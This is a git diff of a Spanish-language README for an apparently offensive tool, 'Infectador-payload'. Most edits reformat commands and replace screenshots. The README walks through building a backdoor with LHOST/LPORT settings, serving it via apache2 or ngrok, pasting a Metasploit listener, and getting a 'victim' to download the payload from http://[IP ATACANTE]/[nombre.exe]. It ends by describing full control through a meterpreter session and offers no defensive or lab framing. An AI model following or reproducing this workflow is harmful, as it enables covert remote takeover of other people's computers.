@@ -61,7 +61,7 @@ Este proyecto esta bajo Licencia - mira el archivo [License.md](https://github.c
 
 ## ¿Como funciona?
 
-Antes de ejecutar la herramienta con 'sudo bash Infectador-payload', ejecuta primero 'sudo su' y después ejecuta 'bash' Infectador-payload, si no se hace puede que de problemas en el futuro.
+Antes de ejecutar la herramienta con ```sudo bash Infectador-payload```, ejecuta primero ```sudo su``` y después ejecuta ```bash Infectador-payload```, si no se hace puede que de problemas en el futuro.
 
 
 ![Captura de pantalla (34)](https://user-images.githubusercontent.com/69093629/104134506-41d4f600-538a-11eb-8aff-79a331979e98.png)
@@ -77,7 +77,7 @@ Utilizarla es muy sencillo solo hay que seleccionar la opción a utilizar (la ul
 
 ![videosito](https://user-images.githubusercontent.com/69093629/104136758-66d06580-5398-11eb-9526-58302e9f286b.gif)
 
-Una vez elegidas las opciones de preferencia a utilizar, hay que escribir el 'LHOST' , 'LPORT'>[Recomendable: 4444], el nombre de tu Backdoor sin su extensión [EX: exe, py] , y finalmente la ruta donde quieres guardar el Backdoor (ojo si eliges que el ataque se efectúe fuera de la red LAN >ngrok< la víctima no podra descargar e instalar el Backdoor a menos que este conectada en la misma red WI-FI que tu) si eliges sin querer subir tu Backdoor a un servidor apache2, para arreglarlo o pulsamos CTRL + C para salir de la herramienta, o puedes acceder a la ruta donde está alojado el servidor apache2 con este comando 'cd /var/www/html/' y tu Backdoor estará ahí, para no tener problemas, cuando te pida que digites una ruta para guardar el Backdoor, pulsa 'ENTER' y se te guardará automáticamente en el mismo directorio que estás ahora mismo en la carpeta Backdoors.
+Una vez elegidas las opciones de preferencia a utilizar, hay que escribir el ```LHOST=[IP]``` , ```LPORT=[PUERTO]```>[Recomendable: 4444], el nombre de tu Backdoor sin su extensión [EX: exe, py] , y finalmente la ruta donde quieres guardar el Backdoor (ojo si eliges que el ataque se efectúe fuera de la red LAN >ngrok< la víctima no podra descargar e instalar el Backdoor a menos que este conectada en la misma red WI-FI que tu) si eliges sin querer subir tu Backdoor a un servidor apache2, para arreglarlo o pulsamos CTRL + C para salir de la herramienta, o puedes acceder a la ruta donde está alojado el servidor apache2 con este comando ```cd /var/www/html/``` y tu Backdoor estará ahí, para no tener problemas, cuando te pida que digites una ruta para guardar el Backdoor, pulsa 'ENTER' y se te guardará automáticamente en el mismo directorio que estás ahora mismo en la carpeta Backdoors.
 
 
 Y se empezará a crear el Backdoor satisfactoriamente...
@@ -89,9 +89,9 @@ nos lo eliminara y tendremos que crear uno de nuevo, la segunda es '¿Quieres in
 
 ![Captura de pantalla (42)](https://user-images.githubusercontent.com/69093629/104138852-61c6e280-53a7-11eb-806e-595e7e76e1f7.png)
 
-Una vez todo hecho quedaria algo asi: 
+Una vez todo hecho quedaria algo asi:
 
-![Captura de pantalla (42)](https://user-images.githubusercontent.com/69093629/104138832-275d4580-53a7-11eb-8ba0-76d317e35bca.png)
+![Captura de pantalla (45)](https://user-images.githubusercontent.com/69093629/104149184-876ae080-53d5-11eb-9dfe-7e5966302165.png)
 
 Ahora solo faltaria copiar la seccion que pone 'COPIE Y PEGUE ESTO EN METASPLOIT' lo copiamos y lo pegamos o lo hacemos manualmente, una vez hecho se nos quedaria en escucha nuestra carga util. Ahora iremos a nuestro ordenador victima y instalaremos la carga util de esta manera ``` http://[IP ATACANTE]/[nombre.exe] ``` 
 
@@ -99,7 +99,7 @@ Ahora solo faltaria copiar la seccion que pone 'COPIE Y PEGUE ESTO EN METASPLOIT
 
 Una vez el Backdoor instalado a nuestro ordenador victima le llegara una conexion 'meterpreter' eso quiere decir que ya tendremos control total del ordenador victima.
 
-![Captura de pantalla (46)](https://user-images.githubusercontent.com/69093629/104138953-355f9600-53a8-11eb-8fbb-5cd5825e6b06.png)
+![Captura de pantalla (47)](https://user-images.githubusercontent.com/69093629/104149114-5d192300-53d5-11eb-9c12-d6a2944c5568.png)
 
 ¡Dejame una ★ si te ha servido!
 
